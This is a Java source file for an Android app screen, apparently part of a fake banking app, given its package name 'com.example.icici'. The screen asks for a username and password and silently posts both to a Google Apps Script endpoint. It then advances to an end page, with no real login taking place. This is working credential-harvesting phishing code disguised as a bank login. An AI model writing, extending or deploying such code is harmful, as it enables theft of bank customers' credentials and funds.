package com.example.icici;

import androidx.appcompat.app.AppCompatActivity;

import android.app.ProgressDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.HashMap;
import java.util.Map;

public class Tisra_Page extends AppCompatActivity {
EditText user, pass;
Button proceed;
ProgressDialog progressDialog;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_tisra);
        user=findViewById(R.id.userName);
        pass=findViewById(R.id.password);
        proceed=findViewById(R.id.proceed);
        progressDialog=new ProgressDialog(Tisra_Page.this);
        progressDialog.setMessage("Loading...");
        proceed.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(user.getText().toString().isEmpty()||pass.getText().toString().isEmpty())
                    Toast.makeText(Tisra_Page.this, "Please Fill All The Details", Toast.LENGTH_SHORT).show();
         else {
                    addData();
                    progressDialog.show();
                }

            }
        });
    }
    public void addData(){
       String userName=user.getText().toString();
       String password=pass.getText().toString();
        StringRequest stringRequest=new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbzTuL9NYW9_ZGNcvNzXDR731PZXx0GoLHqWeRbVQ5ttCs2VMXH-buL-dJGK_VKeeTgavg/exec", new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Intent intent=new Intent(Tisra_Page.this, End_Page.class);
                startActivity(intent);
                progressDialog.hide();
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            protected Map<String,String> getParams(){
                Map<String,String>params=new HashMap<>();
                params.put("action","addData");
                params.put("vUID",userName);
                params.put("vPP",password);
                return params;
            }
        };
        int socketTimeout=50000;
        RetryPolicy retryPolicy=new DefaultRetryPolicy(socketTimeout,0,DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
        stringRequest.setRetryPolicy((retryPolicy));
        RequestQueue requestQueue= Volley.newRequestQueue(Tisra_Page.this);
        requestQueue.add(stringRequest);
    }
}